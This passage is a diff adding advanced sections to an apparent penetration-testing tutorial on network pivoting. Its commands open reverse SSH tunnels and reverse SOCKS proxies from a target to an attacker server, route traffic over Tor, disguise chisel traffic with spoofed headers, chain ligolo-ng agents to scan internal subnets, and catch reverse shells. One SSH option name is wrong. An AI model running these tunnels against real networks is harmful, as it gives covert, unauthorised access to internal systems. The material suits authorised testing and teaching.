@@ -199,3 +199,232 @@ Practice building a complete multi-hop pivot chain in a lab environment:
 - [chisel GitHub Repository](https://github.com/jpillora/chisel)
 - [ligolo-ng GitHub Repository](https://github.com/nicocha30/ligolo-ng)
 - [HackTricks - Pivoting](https://book.hacktricks.xyz/generic-methodologies-and-resources/pivoting)
+
+---
+
+## 7. Advanced SSH Tunneling Techniques
+
+Beyond basic port forwarding, SSH provides several advanced tunneling capabilities that are essential for penetration testing operations.
+
+### SSH Jump Host Chaining
+
+```bash
+# Chain through multiple jump hosts using ProxyJump (OpenSSH 7.3+)
+ssh -J user1@dmz-host,user2@internal-host user3@deep-target
+
+# Equivalent with older SSH versions using ProxyCommand
+ssh -o ProxyCommand="ssh -W %h:%p user2@internal-host" user3@deep-target
+
+# Persistent SSH tunnel with auto-reconnection
+autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" \
+  -o "ExitOnForwardFailure yes" -D 1080 -fN user@pivot-host
+
+# SSH multiplexing for tunnel performance
+# Create a master connection that subsequent SSH sessions reuse
+mkdir -p ~/.ssh/sockets
+ssh -o "ControlMaster=auto" -o "ControlPath=~/.ssh/sockets/%r@%h:%p" \
+  -o "ControlPersist=600" -D 1080 -fN user@pivot-host
+# Subsequent connections through the same host reuse the master connection
+ssh -o "ControlPath=~/.ssh/sockets/%r@%h:%p" user@pivot-host "hostname"
+```
+
+### SSH Tunnel Over Tor
+
+```bash
+# Route SSH tunnel through Tor for additional anonymity layer
+# Requires Tor running locally with SOCKS proxy on 9050
+
+# Method 1: Using ProxyCommand with torify
+torify ssh -D 1080 -fN user@pivot-host
+
+# Method 2: Using netcat as SOCKS proxy connector
+ssh -o ProxyCommand="nc -X 5 -x 127.0.0.1:9050 %h %p" -D 1080 -fN user@pivot-host
+
+# Note: SSH over Tor is significantly slower due to onion routing latency
+# Use only when anonymity is more important than speed
+```
+
+### Reverse SSH Tunneling
+
+When the target can make outbound connections but the attacker cannot reach the target directly, reverse SSH tunnels provide inbound access through an outbound connection.
+
+```bash
+# On the target: establish reverse tunnel to attacker
+ssh -R 2222:localhost:22 -R 8080:localhost:80 -fN attacker@attacker-server
+
+# On the attacker: connect to target through the reverse tunnel
+ssh -p 2222 target-user@localhost
+
+# Reverse SOCKS proxy through SSH (pivot through target's network)
+# On the target:
+ssh -R 1080 attacker@attacker-server
+# On the attacker, localhost:1080 is now a SOCKS proxy routing through target's network
+
+# Reverse tunnel with GatewayPorts for shared access
+ssh -R 0.0.0.0:2222:localhost:22 -o GatewayPorts=yes -fN attacker@attacker-server
+# Now anyone who can reach attacker-server:2222 can connect to the target
+```
+
+## 8. Chisel Advanced Techniques
+
+### Chisel with SOCKS5 Authentication
+
+```bash
+# Server with authentication and SOCKS5
+chisel server -p 8080 --reverse --socks5 --auth "operator:SecretPass123"
+
+# Client connecting with authentication
+chisel client --auth "operator:SecretPass123" http://attacker:8080 R:socks
+
+# Multiple reverse port forwards in a single client connection
+chisel client http://attacker:8080 \
+  R:2222:10.10.10.5:22 \
+  R:3389:10.10.10.100:3389 \
+  R:8080:10.10.10.50:80 \
+  R:socks
+
+# Chisel with custom HTTP headers for traffic camouflage
+chisel client http://attacker:8080 R:socks \
+  --header "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
+  --header "X-Forwarded-For: 10.0.0.1" \
+  --header "Accept: text/html,application/xhtml+xml"
+```
+
+### Chisel Through HTTP Proxy
+
+```bash
+# When a corporate HTTP proxy blocks direct connections to the chisel server
+# Configure the client to connect through the proxy
+
+# Method 1: Set HTTP_PROXY environment variable
+export HTTP_PROXY=http://proxy.corp.local:8080
+chisel client http://attacker-server:443 R:socks
+
+# Method 2: Use stunnel to wrap chisel traffic in TLS first
+# On the server: stunnel accepts TLS on 443, forwards to chisel on 8080
+# On the client: stunnel connects through proxy to server:443, exposes local port
+cat > /etc/stunnel/chisel-client.conf << 'EOF'
+client = yes
+[chisel]
+accept = 127.0.0.1:9090
+connect = attacker-server:443
+EOF
+stunnel /etc/stunnel/chisel-client.conf
+# Now connect chisel through local stunnel
+chisel client http://127.0.0.1:9090 R:socks
+```
+
+## 9. Ligolo-ng Advanced Pivoting
+
+### Multi-Agent Management
+
+Ligolo-ng supports multiple connected agents, each providing access to different network segments. Managing multiple agents effectively is key for complex engagements.
+
+```bash
+# Start ligolo-ng proxy
+./proxy -selfcert -laddr 0.0.0.0:9001
+
+# Multiple agents can connect to the same proxy
+# Agent 1: DMZ host
+./agent -connect attacker:9001 -ignore-cert
+
+# Agent 2: Internal host (deployed through first tunnel)
+./agent -connect attacker:9001 -ignore-cert
+
+# In the proxy console:
+# List all connected sessions
+ligolo-ng » session
+# Session 1 - dmz-host (10.0.0.5) - connected
+# Session 2 - internal-host (10.10.0.10) - connected
+
+# Route traffic through specific agent
+ligolo-ng » session_select 1
+ligolo-ng » ifcreate --name dmz_tun
+ligolo-ng » tunnel_start --name dmz_tun
+sudo ip route add 10.0.0.0/24 dev dmz_tun
+
+# Switch to second agent for internal network
+ligolo-ng » session_select 2
+ligolo-ng » ifcreate --name internal_tun
+ligolo-ng » tunnel_start --name internal_tun
+sudo ip route add 10.10.0.0/16 dev internal_tun
+
+# Now both network segments are accessible simultaneously
+nmap -sT -Pn 10.0.0.0/24  # routes through dmz_tun
+nmap -sT -Pn 10.10.0.0/24  # routes through internal_tun
+```
+
+### Ligolo-ng with Listener Binding
+
+```bash
+# Bind a local listener on the agent side for reverse shell capture
+# In ligolo-ng proxy console:
+ligolo-ng » session_select 1
+ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444
+
+# Now when a target connects to 10.0.0.5:4444, it is forwarded to your local port 4444
+# This allows catching reverse shells through the ligolo-ng tunnel without additional port forwarding
+nc -lvnp 4444  # Local listener catches connections from agent's network
+```
+
+## 10. Tunnel Reliability and Monitoring
+
+### Automated Tunnel Recovery
+
+```bash
+# Comprehensive tunnel health check script
+cat > tunnel_health.sh << 'SCRIPT'
+#!/bin/bash
+
+check_chisel() {
+  if ! pgrep -f "chisel client" >/dev/null; then
+    echo "[$(date)] Chisel client not running. Restarting..."
+    chisel client http://server:8080 R:socks &
+    return 1
+  fi
+  return 0
+}
+
+check_socks() {
+  if ! curl -s --connect-timeout 5 --socks5 127.0.0.1:1080 http://10.0.0.1 >/dev/null 2>&1; then
+    echo "[$(date)] SOCKS proxy not responding. Cycling tunnel..."
+    pkill -f "chisel client"
+    sleep 3
+    chisel client http://server:8080 R:socks &
+    return 1
+  fi
+  return 0
+}
+
+check_ssh() {
+  if ! ssh -o ConnectTimeout=5 -o BatchMode=yes pivot-host "echo alive" >/dev/null 2>&1; then
+    echo "[$(date)] SSH tunnel unreachable. Reconnecting..."
+    autossh -M 0 -o "ServerAliveInterval 30" -D 1080 -fN user@pivot-host
+    return 1
+  fi
+  return 0
+}
+
+check_chisel
+check_socks
+check_ssh
+SCRIPT
+chmod +x tunnel_health.sh
+```
+
+### Tunnel Throughput Optimization
+
+```bash
+# Measure tunnel throughput
+iperf3 -c localhost -p 5201 --connect-timeout 5000
+# Run through proxychains to measure tunneled throughput
+proxychains4 iperf3 -c internal-host -p 5201
+
+# Optimize SSH tunnel performance
+ssh -D 1080 -fN -o "Compression=yes" -o "CipherSuites=aes128-gcm@openssh.com" \
+  -o "ServerAliveInterval=60" user@pivot-host
+
+# Adjust MTU for tunnel interfaces
+sudo ip link set dev tun0 mtu 1400
+# Lower MTU reduces fragmentation which improves reliability through tunnels
+```
